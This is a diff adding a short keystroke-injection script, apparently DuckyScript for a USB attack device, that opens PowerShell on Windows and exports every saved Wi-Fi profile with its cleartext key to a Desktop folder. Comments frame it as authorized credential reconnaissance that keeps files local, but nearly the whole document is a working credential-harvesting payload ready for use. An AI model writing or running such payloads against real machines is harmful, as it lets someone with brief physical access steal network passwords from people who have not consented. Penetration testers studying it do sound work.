@@ -1,0 +1,14 @@
+REM Title:  Saved Wi-Fi profile export (Windows) -- LOCAL ONLY
+REM Class:  credential recon (authorized) -- exports WLAN keys to local disk
+REM Effect: exports every saved Wi-Fi profile (incl. cleartext key) to a folder
+REM         on the Desktop, then opens it. NO exfiltration - files stay on host.
+REM Use:    authorized testing only. Do not run on machines you are not cleared for.
+DEFAULT_DELAY 40
+DELAY 1000
+GUI r
+DELAY 800
+STRING powershell -NoProfile
+ENTER
+DELAY 1600
+STRING $d="$env:USERPROFILE\Desktop\wifi_$($env:COMPUTERNAME)"; New-Item -ItemType Directory -Force $d | Out-Null; netsh wlan export profile key=clear folder="$d"; explorer $d
+ENTER
